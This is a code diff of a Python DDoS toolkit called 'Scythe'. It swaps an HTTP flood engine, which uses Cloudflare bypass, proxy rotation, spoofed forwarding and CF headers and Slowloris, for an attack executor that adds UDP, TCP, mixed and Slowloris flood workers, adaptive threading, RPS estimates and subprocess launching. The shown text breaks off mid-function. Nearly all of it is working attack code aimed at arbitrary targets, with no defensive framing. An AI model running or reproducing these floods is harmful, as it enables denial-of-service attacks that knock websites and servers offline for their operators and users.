@@ -1,440 +1,190 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║  SCYTHE L7 ENGINE v15.0 — PROFESSIONAL EDITION (MHDDoS-LEVEL)              ║
-║  🔥 6 METHODS: httpbypass, cf-flood, slow, httpget, httpflood, auto        ║
-║  🔥 HTTP Client: requests + cloudscraper (bypass Cloudflare)               ║
-║  🔥 Proxy: PyRoxy (support HTTP, HTTPS, SOCKS4, SOCKS5)                    ║
-║  🔥 Session per proxy: 50 requests/proxy (hemat proxy)                    ║
-║  🔥 Auto fallback to direct if all proxies dead                           ║
-║  🔥 Smart retry + error limiting                                          ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
+SCYTHE ATTACK EXECUTOR v11.0 — 6 L7 + 4 L4 METHODS + CLOUDSCRAPER
 """
-import sys
 import os
+import sys
 import time
-import random
+import json
+import re
+import subprocess
 import threading
-import urllib.parse
-import hashlib
-import base64
-from collections import deque
+import socket
+import random
+from datetime import datetime
 
-# ─── Pastikan dependensi terinstall ───
 try:
-    import requests
-    import cloudscraper
-    from PyRoxy import Proxy, ProxyType
+    from state_manager import state, MAX_CONCURRENT, MAX_HOLD_TIME
 except ImportError as e:
-    print("[ERROR] Missing dependencies. Install: pip3 install requests cloudscraper PyRoxy")
+    print("[FATAL] state_manager.py not found.")
     sys.exit(1)
 
-# ─── Cari proxies.txt ───
-def find_proxy_file(filename="proxies.txt"):
-    paths = [
-        filename,
-        os.path.join(os.path.dirname(__file__), filename),
-        os.path.join(os.path.dirname(os.path.dirname(__file__)), filename),
-        "/root/ddosxscythe/" + filename,
-    ]
-    for p in paths:
-        if os.path.exists(p):
-            return os.path.abspath(p)
-    return None
+# ─── METHODS DATABASE (6 L7 + 4 L4) ───
+METHODS = {
+    # LAYER 7
+    "httpbypass":  {"layer": 7, "type": "py", "engine": "l7", "desc": "CF bypass + header spoofing", "target": "Cloudflare, Akamai"},
+    "cf-flood":    {"layer": 7, "type": "py", "engine": "l7", "desc": "CF header manipulation + cache bypass", "target": "Cloudflare"},
+    "slow":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Slowloris connection hold", "target": "Apache, nginx"},
+    "httpget":     {"layer": 7, "type": "py", "engine": "l7", "desc": "Standard GET flood with random paths", "target": "Any HTTP server"},
+    "httpflood":   {"layer": 7, "type": "py", "engine": "l7", "desc": "Keep-alive connections, multiple requests", "target": "Load balancers"},
+    "auto":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Auto-switch methods (adaptive)", "target": "Any"},
+    # LAYER 4
+    "udp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP datagram flood", "target": "Game servers, DNS"},
+    "tcp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP SYN flood", "target": "Web servers"},
+    "mixed":       {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP + TCP mixed flood", "target": "Firewalls, generic"},
+    "slowloris":   {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP connection hold (Slowloris at L4)", "target": "Apache, nginx"},
+}
 
-# ─── ProxyManager (dengan auto-reload dan dukungan PyRoxy) ───
-class ProxyManager:
-    def __init__(self, proxy_file):
-        self.proxy_file = proxy_file
-        self.proxies = []
-        self.lock = threading.Lock()
-        self.last_reload = 0
-        self.reload_interval = 15  # reload setiap 15 detik
-        self._load()
+# ─── VPS SPECS ───
+def get_vps_specs():
+    try:
+        with open('/proc/cpuinfo', 'r') as f:
+            cpu_count = f.read().count('processor\t:')
+    except:
+        cpu_count = os.cpu_count() or 1
+    try:
+        with open('/proc/meminfo', 'r') as f:
+            for line in f:
+                if line.startswith('MemTotal:'):
+                    ram_kb = int(line.split()[1])
+                    ram_gb = ram_kb / (1024 * 1024)
+                    break
+    except:
+        ram_gb = 1.0
+    try:
+        stat = os.statvfs('/')
+        disk_gb = (stat.f_blocks * stat.f_frsize) / (1024**3)
+    except:
+        disk_gb = 10.0
+    return cpu_count, ram_gb, disk_gb
 
-    def _load(self):
-        if not self.proxy_file or not os.path.exists(self.proxy_file):
-            self.proxies = []
-            return
-        try:
-            with open(self.proxy_file, "r") as f:
-                raw = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
-            # Filter dan parse dengan PyRoxy
-            parsed = []
-            for p in raw:
-                try:
-                    # PyRoxy bisa parse berbagai format
-                    proxy = Proxy(p)
-                    parsed.append(proxy)
-                except:
-                    continue
-            with self.lock:
-                self.proxies = parsed
-                self.last_reload = time.time()
-            if parsed:
-                print(f"[PROXY] Loaded {len(parsed)} proxies", flush=True)
-        except Exception as e:
-            print(f"[PROXY ERROR] {e}", flush=True)
+def calculate_rps_estimate(proxy_count, concurrent_attacks):
+    cpu_count, ram_gb, _ = get_vps_specs()
+    base_rps_per_core_l7 = 8000
+    base_rps_per_core_l4 = 20000
+    ram_factor = min(ram_gb / (concurrent_attacks * 0.2 + 0.1), 1.0)
+    cpu_available = cpu_count / max(concurrent_attacks, 1)
+    cpu_factor_l7 = min(cpu_available / 0.3, 1.0)
+    cpu_factor_l4 = min(cpu_available / 0.1, 1.0)
+    proxy_rps = proxy_count * 150
+    l7_rps = int(base_rps_per_core_l7 * cpu_count * cpu_factor_l7 * ram_factor)
+    l4_rps = int(base_rps_per_core_l4 * cpu_count * cpu_factor_l4 * ram_factor)
+    l7_rps = min(l7_rps, proxy_rps)
+    l4_rps = min(l4_rps, proxy_rps)
+    return l7_rps, l4_rps
 
-    def get(self):
-        if time.time() - self.last_reload > self.reload_interval:
-            self._load()
-        with self.lock:
-            if not self.proxies:
-                return None
-            return random.choice(self.proxies)
+def get_adaptive_threads(method, duration):
+    cpu_count, ram_gb, _ = get_vps_specs()
+    if method in ['httpbypass', 'cf-flood', 'slow', 'httpget', 'httpflood', 'auto']:
+        base_per_core = 150
+    elif method in ['udp', 'tcp', 'mixed', 'slowloris']:
+        base_per_core = 500
+    else:
+        base_per_core = 200
+    duration_factor = min(2.0, 60 / max(duration, 10))
+    threads = int(cpu_count * base_per_core * duration_factor)
+    threads = max(50, min(threads, 5000))
+    return threads
 
-    def count(self):
-        with self.lock:
-            return len(self.proxies)
-
-# ─── L7 Engine ───
-class L7AttackEngine:
-    def __init__(self, target, duration, threads, proxy_file=None, method_type="httpbypass"):
+# ─── L4 ENGINE (Built-in, simple) ───
+class L4AttackEngine:
+    def __init__(self, target, port, duration, threads, method_type="udp"):
         self.target = target
+        self.port = int(port)
         self.duration = int(duration)
         self.threads = int(threads)
         self.method_type = method_type.lower()
-        self.proxy_mgr = ProxyManager(proxy_file)
         self.running = False
         self.total_requests = 0
         self.total_bytes = 0
         self.counter_lock = threading.Lock()
         self.start_time = 0
         self.end_time = 0
-        self.error_count = 0
-        self.error_lock = threading.Lock()
-        self.error_log_limit = 30
-        self.error_log_time = 0
-        self.requests_per_proxy = 50  # 🔥 hemat proxy
-        self._parse_target()
-        # Siapkan cloudscraper session (tanpa proxy)
-        self.scraper = cloudscraper.create_scraper(
-            browser={
-                'browser': 'chrome',
-                'platform': 'windows',
-                'mobile': False
-            }
-        )
-        self.scraper.verify = False
-        self.session = requests.Session()
-        self.session.verify = False
 
-    def _parse_target(self):
-        if not self.target.startswith(('http://', 'https://')):
-            self.target = 'https://' + self.target
-        parsed = urllib.parse.urlparse(self.target)
-        self.scheme = parsed.scheme or 'https'
-        self.host = parsed.netloc or parsed.path
-        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
-        if ':' in self.host:
-            self.host = self.host.split(':')[0]
-
-    def _headers(self, extra=None):
-        ua = random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        ])
-        headers = {
-            'User-Agent': ua,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'fr-FR,fr;q=0.9']),
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-        }
-        if random.random() > 0.5:
-            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        if random.random() > 0.5:
-            headers['Referer'] = f"https://{self.host}/"
-        if extra:
-            headers.update(extra)
-        return headers
-
-    def _path(self):
-        paths = ['/', '/index.html', '/api', '/home', '/login', '/register', '/wp-admin',
-                 '/admin', '/assets/', '/favicon.ico', '/sitemap.xml', '/robots.txt',
-                 '/api/v1/users', '/api/v1/orders', '/graphql', '/search', '/category']
-        path = random.choice(paths)
-        if random.random() > 0.3:
-            path += f"?cb={random.randint(100000,999999)}&t={int(time.time())}"
-        return path
-
-    def _log_error(self, msg):
-        with self.error_lock:
-            now = time.time()
-            if now - self.error_log_time > 1:
-                self.error_log_time = now
-                self.error_count = 0
-            if self.error_count < self.error_log_limit:
-                self.error_count += 1
-                print(f"[ERROR] {msg}", flush=True)
-
-    # ─── CORE SEND REQUEST (menggunakan requests + cloudscraper) ───
-    def _send_request(self, proxy=None, method='GET', path=None, body=None, extra_headers=None, retries=2):
-        url = f"{self.scheme}://{self.host}{path or self._path()}"
-        headers = self._headers(extra_headers)
-        proxies = None
-        if proxy:
-            # PyRoxy Proxy object -> format untuk requests
+    def _udp_worker(self):
+        end_time = self.end_time
+        local_count = 0
+        local_bytes = 0
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while self.running and time.time() < end_time:
             try:
-                proxy_url = proxy.asRequest()
-                proxies = {
-                    'http': proxy_url,
-                    'https': proxy_url
-                }
+                data = random._urandom(random.randint(64, 2048))
+                sock.sendto(data, (self.target, self.port))
+                local_count += 1
+                local_bytes += len(data)
             except:
-                # fallback: gunakan string langsung
-                proxy_str = str(proxy)
-                if not proxy_str.startswith('http'):
-                    proxy_str = 'http://' + proxy_str
-                proxies = {'http': proxy_str, 'https': proxy_str}
+                pass
+        sock.close()
+        with self.counter_lock:
+            self.total_requests += local_count
+            self.total_bytes += local_bytes
 
-        for attempt in range(retries):
+    def _tcp_worker(self):
+        end_time = self.end_time
+        local_count = 0
+        while self.running and time.time() < end_time:
             try:
-                # Gunakan cloudscraper untuk bypass Cloudflare, atau requests biasa
-                if 'cloudflare' in self.target or 'cf' in self.target:
-                    resp = self.scraper.request(
-                        method=method,
-                        url=url,
-                        headers=headers,
-                        proxies=proxies,
-                        timeout=10,
-                        allow_redirects=True
-                    )
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((self.target, self.port))
+                sock.sendall(random._urandom(random.randint(64, 1024)))
+                sock.close()
+                local_count += 1
+            except:
+                pass
+        with self.counter_lock:
+            self.total_requests += local_count
+
+    def _mixed_worker(self):
+        end_time = self.end_time
+        local_count = 0
+        while self.running and time.time() < end_time:
+            try:
+                if random.random() > 0.5:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.sendto(random._urandom(1024), (self.target, self.port))
+                    sock.close()
                 else:
-                    # Buat session baru per request agar proxy tidak terkunci
-                    with requests.Session() as sess:
-                        sess.verify = False
-                        sess.proxies = proxies
-                        resp = sess.request(
-                            method=method,
-                            url=url,
-                            headers=headers,
-                            timeout=10,
-                            allow_redirects=True
-                        )
-                # Sukses walau status code 4xx/5xx
-                return True, len(resp.content)
-            except Exception as e:
-                # Jika proxy gagal dan masih ada percobaan
-                if attempt < retries - 1:
-                    continue
-                # Coba direct jika proxy gagal
-                if proxy:
-                    return self._send_request(proxy=None, method=method, path=path,
-                                               body=body, extra_headers=extra_headers, retries=1)
-                self._log_error(f"request failed: {e}")
-                return False, 0
-        return False, 0
-
-    # ─── WORKER (session per proxy) ───
-    def _httpbypass_worker(self):
-        end_time = self.end_time
-        local_count = 0
-        local_bytes = 0
-        while self.running and time.time() < end_time:
-            proxy = self.proxy_mgr.get()
-            for _ in range(self.requests_per_proxy):
-                if not self.running or time.time() >= end_time:
-                    break
-                try:
-                    extra = {
-                        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
-                        'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
-                        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
-                    }
-                    if random.random() > 0.5:
-                        extra['Sec-Ch-Ua'] = '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'
-                        extra['Sec-Ch-Ua-Mobile'] = '?0'
-                        extra['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
-                    success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
-                    if success:
-                        local_count += 1
-                        local_bytes += bytes_recv
-                    else:
-                        break
-                except Exception as e:
-                    self._log_error(f"httpbypass: {e}")
-                    break
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(2)
+                    sock.connect((self.target, self.port))
+                    sock.close()
+                local_count += 1
+            except:
+                pass
         with self.counter_lock:
             self.total_requests += local_count
-            self.total_bytes += local_bytes
 
-    def _cfflood_worker(self):
-        end_time = self.end_time
-        local_count = 0
-        local_bytes = 0
-        while self.running and time.time() < end_time:
-            proxy = self.proxy_mgr.get()
-            for _ in range(self.requests_per_proxy):
-                if not self.running or time.time() >= end_time:
-                    break
-                try:
-                    extra = {
-                        'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
-                        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                        'CF-IPCountry': random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL']),
-                        'CF-Visitor': '{"scheme": "https"}',
-                        'CF-Request-ID': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
-                        'Cookie': f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}",
-                    }
-                    success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
-                    if success:
-                        local_count += 1
-                        local_bytes += bytes_recv
-                    else:
-                        break
-                except Exception as e:
-                    self._log_error(f"cfflood: {e}")
-                    break
-        with self.counter_lock:
-            self.total_requests += local_count
-            self.total_bytes += local_bytes
-
-    def _slow_worker(self):
-        # Slowloris: buka koneksi dan kirim header parsial
+    def _slowloris_worker(self):
         end_time = self.end_time
         local_count = 0
         connections = []
         while self.running and time.time() < end_time:
             try:
-                while len(connections) < 100 and self.running and time.time() < end_time:
-                    proxy = self.proxy_mgr.get()
-                    if proxy:
-                        # Buat koneksi via proxy (PyRoxy)
-                        try:
-                            sock = proxy.open_socket()
-                            sock.settimeout(10)
-                            # Kirim request awal
-                            sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
-                            connections.append({'sock': sock, 'last': time.time()})
-                            local_count += 1
-                        except Exception as e:
-                            self._log_error(f"slow connect: {e}")
-                            continue
-                    else:
-                        # Direct
-                        try:
-                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            sock.settimeout(10)
-                            sock.connect((self.host, self.port))
-                            if self.scheme == 'https':
-                                import ssl
-                                ctx = ssl.create_default_context()
-                                ctx.check_hostname = False
-                                ctx.verify_mode = ssl.CERT_NONE
-                                sock = ctx.wrap_socket(sock, server_hostname=self.host)
-                            sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
-                            connections.append({'sock': sock, 'last': time.time()})
-                            local_count += 1
-                        except Exception as e:
-                            self._log_error(f"slow direct connect: {e}")
-                            continue
-
-                # Jaga koneksi
+                while len(connections) < 50 and self.running:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    sock.connect((self.target, self.port))
+                    sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
+                    connections.append({'sock': sock, 'last': time.time()})
+                    local_count += 1
                 for conn in connections[:]:
-                    if time.time() - conn['last'] > random.randint(8, 15):
+                    if time.time() - conn['last'] > 10:
                         try:
-                            header = ''.join(random.choices(string.ascii_letters, k=random.randint(5,15)))
-                            value = random._urandom(random.randint(10,100)).hex()
-                            conn['sock'].sendall(f"{header}: {value}\r\n".encode())
+                            conn['sock'].sendall(f"X-{random.randint(1,9999)}: A\r\n".encode())
                             conn['last'] = time.time()
                         except:
-                            try: conn['sock'].close()
-                            except: pass
                             connections.remove(conn)
                 time.sleep(0.5)
-            except Exception as e:
-                self._log_error(f"slow outer: {e}")
+            except:
+                pass
         for conn in connections:
             try: conn['sock'].close()
             except: pass
         with self.counter_lock:
             self.total_requests += local_count
 
-    def _httpget_worker(self):
-        end_time = self.end_time
-        local_count = 0
-        local_bytes = 0
-        while self.running and time.time() < end_time:
-            proxy = self.proxy_mgr.get()
-            for _ in range(self.requests_per_proxy):
-                if not self.running or time.time() >= end_time:
-                    break
-                try:
-                    path = self._path()
-                    success, bytes_recv = self._send_request(proxy=proxy, path=path, retries=2)
-                    if success:
-                        local_count += 1
-                        local_bytes += bytes_recv
-                    else:
-                        break
-                except Exception as e:
-                    self._log_error(f"httpget: {e}")
-                    break
-        with self.counter_lock:
-            self.total_requests += local_count
-            self.total_bytes += local_bytes
-
-    def _httpflood_worker(self):
-        # Keep-alive: buka koneksi per proxy, kirim banyak request
-        end_time = self.end_time
-        local_count = 0
-        local_bytes = 0
-        while self.running and time.time() < end_time:
-            proxy = self.proxy_mgr.get()
-            # Buat session untuk proxy ini
-            sess = requests.Session()
-            sess.verify = False
-            if proxy:
-                try:
-                    proxy_url = proxy.asRequest()
-                    sess.proxies = {'http': proxy_url, 'https': proxy_url}
-                except:
-                    proxy_str = str(proxy)
-                    if not proxy_str.startswith('http'):
-                        proxy_str = 'http://' + proxy_str
-                    sess.proxies = {'http': proxy_str, 'https': proxy_str}
-            try:
-                for _ in range(self.requests_per_proxy):
-                    if not self.running or time.time() >= end_time:
-                        break
-                    path = self._path()
-                    headers = self._headers()
-                    resp = sess.get(
-                        f"{self.scheme}://{self.host}{path}",
-                        headers=headers,
-                        timeout=10
-                    )
-                    local_count += 1
-                    local_bytes += len(resp.content)
-            except Exception as e:
-                self._log_error(f"httpflood: {e}")
-            finally:
-                sess.close()
-        with self.counter_lock:
-            self.total_requests += local_count
-            self.total_bytes += local_bytes
-
-    def _auto_worker(self):
-        workers = [self._httpbypass_worker, self._cfflood_worker,
-                   self._httpget_worker, self._httpflood_worker]
-        idx = 0
-        last_switch = time.time()
-        switch_interval = 30
-        end_time = self.end_time
-        while self.running and time.time() < end_time:
-            if time.time() - last_switch > switch_interval:
-                idx = (idx + 1) % len(workers)
-                last_switch = time.time()
-            workers[idx]()
-            time.sleep(0.1)
-
-    # ─── RPS REPORTER ───
     def _rps_reporter(self):
         last_total = 0
         last_time = time.time()
@@ -444,24 +194,17 @@ class L7AttackEngine:
                 current_total = self.total_requests
             elapsed = time.time() - last_time
             rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
-            print(f"RPS: {rps} | Total: {current_total} | Proxy: {self.proxy_mgr.count()}", flush=True)
+            print(f"RPS: {rps} | Total: {current_total} | L4: {self.method_type.upper()}", flush=True)
             sys.stdout.flush()
             last_total = current_total
             last_time = time.time()
 
-    # ─── START ───
     def start(self):
         self.running = True
         self.start_time = time.time()
         self.end_time = self.start_time + self.duration
-        proxy_count = self.proxy_mgr.count()
-
-        print(f"\n[Scythe L7 v15.0] {self.method_type.upper()} attack launched", flush=True)
-        print(f"🎯 Target: {self.target}", flush=True)
-        print(f"⏱️  Duration: {self.duration}s | Threads: {self.threads} | Proxies: {proxy_count}", flush=True)
-        print(f"🔁 Requests per proxy: {self.requests_per_proxy}", flush=True)
-        if proxy_count == 0:
-            print(f"⚠️  No proxies — using DIRECT connection (your VPS IP)", flush=True)
+        print(f"\n[Scythe L4] {self.method_type.upper()} attack launched", flush=True)
+        print(f"Target: {self.target}:{self.port} | Duration: {self.duration}s | Threads: {self.threads}", flush=True)
         print(f"{'='*60}\n", flush=True)
         sys.stdout.flush()
 
@@ -469,77 +212,343 @@ class L7AttackEngine:
         reporter.start()
 
         worker_map = {
-            'httpbypass': self._httpbypass_worker,
-            'cf-flood': self._cfflood_worker,
-            'slow': self._slow_worker,
-            'httpget': self._httpget_worker,
-            'httpflood': self._httpflood_worker,
-            'auto': self._auto_worker,
+            'udp': self._udp_worker,
+            'tcp': self._tcp_worker,
+            'mixed': self._mixed_worker,
+            'slowloris': self._slowloris_worker,
         }
-        worker_func = worker_map.get(self.method_type, self._httpbypass_worker)
-
-        threads = []
+        worker_func = worker_map.get(self.method_type, self._udp_worker)
+        thread_pool = []
         for _ in range(self.threads):
             t = threading.Thread(target=worker_func, daemon=True)
             t.start()
-            threads.append(t)
-
-        # Monitor early death
-        time.sleep(2)
-        alive = sum(1 for t in threads if t.is_alive())
-        if alive == 0:
-            print(f"[WARN] All threads died! Forcing direct mode...", flush=True)
-            with self.proxy_mgr.lock:
-                self.proxy_mgr.proxies = []
-            for _ in range(self.threads):
-                t = threading.Thread(target=worker_func, daemon=True)
-                t.start()
-                threads.append(t)
-
-        time.sleep(max(0, self.duration - 2))
+            thread_pool.append(t)
+        time.sleep(self.duration)
         self.running = False
-
-        for t in threads:
+        for t in thread_pool:
             t.join(timeout=2)
-
         with self.counter_lock:
             final_total = self.total_requests
             final_bytes = self.total_bytes
-
         elapsed = time.time() - self.start_time
         avg_rps = int(final_total / elapsed) if elapsed > 0 else 0
-
-        print(f"\n[Scythe L7] Attack completed!", flush=True)
-        print(f"📊 Total Requests: {final_total:,} | Avg RPS: {avg_rps:,} | Bytes: {final_bytes:,}", flush=True)
-        print(f"⚠️  Total Errors: {self.error_count}", flush=True)
+        print(f"\n[Scythe L4] Attack completed!", flush=True)
+        print(f"Total: {final_total:,} | Avg RPS: {avg_rps:,} | Bytes: {final_bytes:,}", flush=True)
         print(f"{'='*60}\n", flush=True)
         sys.stdout.flush()
-
         return final_total, avg_rps, final_bytes
 
+# ─── ATTACK EXECUTOR ───
+class AttackExecutor:
+    def __init__(self):
+        self.processes = {}
+        self.proxy_running = False
+        self.lock = threading.Lock()
+        self._rps_regex = re.compile(r'RPS:\s*(\d+)', re.IGNORECASE)
+        self._total_regex = re.compile(r'Total:\s*(\d+)', re.IGNORECASE)
+        self._bytes_regex = re.compile(r'Bytes:\s*(\d+)', re.IGNORECASE)
+
+    def start_proxy_refresh(self):
+        if self.proxy_running:
+            return
+        self.proxy_running = True
+        def refresh():
+            while self.proxy_running:
+                try:
+                    subprocess.run(["python3", "getproxy.py"], capture_output=True, text=True, timeout=15)
+                except:
+                    pass
+                time.sleep(7)
+        t = threading.Thread(target=refresh, daemon=True)
+        t.start()
+
+    def stop_proxy_refresh(self):
+        self.proxy_running = False
+
+    def get_proxy_count(self):
+        try:
+            if os.path.exists("proxies.txt"):
+                with open("proxies.txt", 'r') as f:
+                    return len([l for l in f if l.strip()])
+        except:
+            pass
+        return 0
+
+    def get_attack_info(self, method, target, port, duration, hold_time):
+        info = METHODS.get(method, {})
+        threads = get_adaptive_threads(method, int(duration))
+        proxy_count = self.get_proxy_count()
+        l7_rps, l4_rps = calculate_rps_estimate(proxy_count, len(state.state["active_attacks"]) + 1)
+        est_rps = l7_rps if info.get("layer") == 7 else l4_rps
+        return {
+            "method": method,
+            "target": target,
+            "port": port,
+            "duration": duration,
+            "hold_time": hold_time or duration,
+            "threads": threads,
+            "proxy_count": proxy_count,
+            "est_rps": est_rps,
+            "layer": info.get("layer", 7),
+            "desc": info.get("desc", ""),
+        }
+
+    def execute(self, method, target, port, duration, hold_time=None):
+        try:
+            duration = int(duration)
+        except:
+            print("[ERROR] Invalid duration")
+            return False
+
+        if method not in METHODS:
+            print(f"[ERROR] Unknown method: {method}")
+            return False
+
+        info = METHODS[method]
+        layer = info["layer"]
+
+        self.start_proxy_refresh()
+        proxy_count = self.get_proxy_count()
+        threads = get_adaptive_threads(method, duration)
+        l7_rps, l4_rps = calculate_rps_estimate(proxy_count, len(state.state["active_attacks"]) + 1)
+        rps_estimate = l7_rps if layer == 7 else l4_rps
+
+        actual_hold = int(hold_time) if hold_time else min(duration, MAX_HOLD_TIME)
+        actual_hold = min(actual_hold, MAX_HOLD_TIME)
+
+        if layer == 7 and not target.startswith("http"):
+            target = "https://" + target
+
+        # Add to state
+        success, result = state.add_attack(
+            f"{target}:{port}", method, duration, layer, proxy_count, actual_hold, threads
+        )
+        if not success:
+            print(f"[ERROR] {result}")
+            return False
+
+        attack_id = result
+        print(f"\n[+] Attack ID: {attack_id}")
+        print(f"    Threads: {threads} | Est. RPS: ~{rps_estimate} | Proxies: {proxy_count}")
+
+        try:
+            script_dir = os.path.dirname(os.path.abspath(__file__))
+            if layer == 7:
+                engine_path = os.path.join(script_dir, "methods", "l7_engine.py")
+                if not os.path.exists(engine_path):
+                    print(f"[ERROR] l7_engine.py not found at: {engine_path}")
+                    state.remove_attack(attack_id)
+                    return False
+
+                # Proxy file path
+                proxy_file_path = os.path.join(script_dir, "proxies.txt")
+                if not os.path.exists(proxy_file_path):
+                    proxy_file_path = os.path.join(os.path.dirname(script_dir), "proxies.txt")
+                proxy_file_path = os.path.abspath(proxy_file_path)
+
+                cmd = [sys.executable, engine_path, method, target, str(duration), str(threads), proxy_file_path]
+                env = os.environ.copy()
+                env['PYTHONUNBUFFERED'] = '1'
+
+                proc = subprocess.Popen(
+                    cmd,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    bufsize=1,
+                    universal_newlines=True,
+                    cwd=script_dir,
+                    env=env
+                )
+                # Update state with PID
+                for attack in state.state["active_attacks"]:
+                    if attack["id"] == attack_id:
+                        attack["pid"] = proc.pid
+                        break
+                state._save()
+
+                with self.lock:
+                    self.processes[attack_id] = proc
+
+                # Start monitor
+                monitor = threading.Thread(
+                    target=self._monitor_attack,
+                    args=(attack_id, proc, duration, actual_hold, method)
+                )
+                monitor.daemon = True
+                monitor.start()
+                return True
+            else:
+                # L4 engine (built-in, but we'll run in thread with queue)
+                import queue
+                rps_queue = queue.Queue()
+                def l4_thread():
+                    engine = L4AttackEngine(target, port, duration, threads, method)
+                    def new_reporter():
+                        last_total = 0
+                        last_time = time.time()
+                        while engine.running:
+                            time.sleep(1)
+                            with engine.counter_lock:
+                                current_total = engine.total_requests
+                            elapsed = time.time() - last_time
+                            rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
+                            rps_queue.put((rps, current_total, engine.total_bytes))
+                            print(f"RPS: {rps} | Total: {current_total} | L4: {engine.method_type.upper()}", flush=True)
+                            sys.stdout.flush()
+                            last_total = current_total
+                            last_time = time.time()
+                    engine._rps_reporter = new_reporter
+                    engine.start()
+                t = threading.Thread(target=l4_thread, daemon=True)
+                t.start()
+                with self.lock:
+                    self.processes[attack_id] = t
+
+                def l4_monitor():
+                    start = time.time()
+                    peak_rps = 0
+                    total_requests = 0
+                    total_bytes = 0
+                    last_rps = 0
+                    while True:
+                        try:
+                            rps, total, bytes_sent = rps_queue.get(timeout=2)
+                            last_rps = rps
+                            peak_rps = max(peak_rps, rps)
+                            total_requests = total
+                            total_bytes += bytes_sent
+                            proxy_count = self.get_proxy_count()
+                            state.update_rps(attack_id, last_rps, total_requests, peak_rps, proxy_count, total_bytes)
+                            elapsed = time.time() - start
+                            if elapsed >= max(duration, actual_hold):
+                                break
+                        except queue.Empty:
+                            elapsed = time.time() - start
+                            if elapsed >= max(duration, actual_hold):
+                                break
+                            continue
+                    state.remove_attack(attack_id)
+                    with self.lock:
+                        if attack_id in self.processes:
+                            del self.processes[attack_id]
+                    print(f"\n[+] L4 Attack {attack_id[:12]}... completed.")
+                    print(f"    Total: {total_requests:,} | Peak RPS: {peak_rps:,} | Bytes: {total_bytes:,}")
+                l4_mon = threading.Thread(target=l4_monitor, daemon=True)
+                l4_mon.start()
+                return True
+
+        except Exception as e:
+            print(f"[ERROR] Failed to launch: {e}")
+            import traceback
+            traceback.print_exc()
+            state.remove_attack(attack_id)
+            return False
+
+    def _monitor_attack(self, attack_id, proc, duration, hold_time, method):
+        start = time.time()
+        peak_rps = 0
+        total_requests = 0
+        total_bytes = 0
+        last_rps = 0
+        try:
+            for line in iter(proc.stdout.readline, ''):
+                if not line:
+                    break
+                line = line.strip()
+                if not line:
+                    continue
+                parsed_rps, parsed_total, parsed_bytes = self._parse_rps_from_line(line)
+                if parsed_rps > 0:
+                    last_rps = parsed_rps
+                    peak_rps = max(peak_rps, parsed_rps)
+                if parsed_total > 0:
+                    total_requests = parsed_total
+                if parsed_bytes > 0:
+                    total_bytes += parsed_bytes
+                elapsed = time.time() - start
+                proxy_count = self.get_proxy_count()
+                state.update_rps(attack_id, last_rps, total_requests, peak_rps, proxy_count, total_bytes)
+                if elapsed >= max(duration, hold_time):
+                    proc.terminate()
+                    break
+        except Exception as e:
+            print(f"[WARN] Monitor error: {e}")
+        # Cleanup
+        try:
+            stderr_data = proc.stderr.read()
+            if stderr_data:
+                stderr_lines = stderr_data.strip().split('\n')[-5:]
+                for line in stderr_lines:
+                    if line.strip():
+                        print(f"[DEBUG] {line.strip()}")
+        except:
+            pass
+        try:
+            proc.wait(timeout=5)
+        except:
+            proc.kill()
+        elapsed = time.time() - start
+        # Final state update
+        for attack in state.state["active_attacks"]:
